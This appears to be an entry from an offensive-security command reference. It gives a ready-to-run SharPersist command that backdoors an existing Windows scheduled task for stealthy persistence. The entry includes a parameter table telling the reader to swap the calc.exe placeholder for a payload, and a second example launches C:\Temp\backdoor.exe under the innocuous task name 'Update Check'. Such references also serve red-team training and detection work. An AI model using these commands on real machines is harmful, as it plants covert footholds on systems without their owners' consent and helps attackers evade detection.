---
type: command
executor: powershell
data: >-
  SharPersist -t schtaskbackdoor -c "C:\Windows\System32\cmd.exe" -a "/c
  calc.exe" -n "Something Cool" -m add
output: null
platforms:
  - Windows
tags:
  - persistence
  - scheduled-task
verified: true
validated: true
---

# sharpersist-add-schtaskbackdoor

## Command

```powershell
SharPersist -t schtaskbackdoor -c "C:\Windows\System32\cmd.exe" -a "/c calc.exe" -n "Something Cool" -m add
```

## Description

Adds a backdoor to an existing scheduled task using SharPersist for stealthy persistence.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| -t schtaskbackdoor | Target type: backdoor existing task | Yes |
| -c "...cmd.exe" | Command to execute | Yes |
| -a "/c calc.exe" | Arguments (replace with payload) | Yes |
| -n "Something Cool" | Task name | Yes |
| -m add | Mode: add to task | Yes |

## Examples

### Basic Usage

```powershell
SharPersist -t schtaskbackdoor -c "cmd.exe" -a "/c C:\Temp\backdoor.exe" -n "Update Check" -m add
```

## Expected Output

Task updated successfully; no errors from SharPersist.

## Related

- [[tools/SharPersist]]
- [[procedures/Create-Scheduled-Task-Backdoor-for-Persistence]]
